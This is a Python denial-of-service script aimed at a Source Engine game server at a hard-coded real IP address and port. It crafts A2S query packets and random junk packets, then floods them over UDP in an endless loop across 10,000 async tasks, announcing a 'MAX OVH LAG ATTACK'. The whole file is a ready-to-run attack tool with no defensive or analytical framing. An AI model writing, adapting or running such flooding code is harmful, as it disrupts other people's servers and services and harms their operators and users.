import socket, asyncio, random, struct

ip = "162.19.235.199"
port = 27015

# Generate the most deadly Source Engine packets
def generate_packets():
    packets = []

    # 1️⃣ A2S_RULES (High CPU Cost Query)
    a2s_rules = b"\xFF\xFF\xFF\xFFV" + bytes(random.getrandbits(8) for _ in range(50))
    packets.append(a2s_rules)

    # 2️⃣ Corrupt Packets (Server Gets Confused)
    for _ in range(5):
        packets.append(b"\xFF\xFF\xFF\xFF" + bytes(random.getrandbits(8) for _ in range(random.randint(500, 1400))))

    # 3️⃣ Fake A2S_INFO Flood (Looks Legit, Wastes CPU)
    a2s_info = b"\xFF\xFF\xFF\xFFTSource Engine Query\x00"
    packets.append(a2s_info)

    return packets

async def flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packets = generate_packets()

    while True:
        for data in packets:
            sock.sendto(data, (ip, port))

# 10,000+ Simultaneous Async Tasks for Non-Stop Lag
async def main():
    tasks = [flood() for _ in range(10000)]
    await asyncio.gather(*tasks)

# Execute the script
if __name__ == "__main__":
    print("🔥 Launching MAX OVH LAG ATTACK...")
    asyncio.run(main())
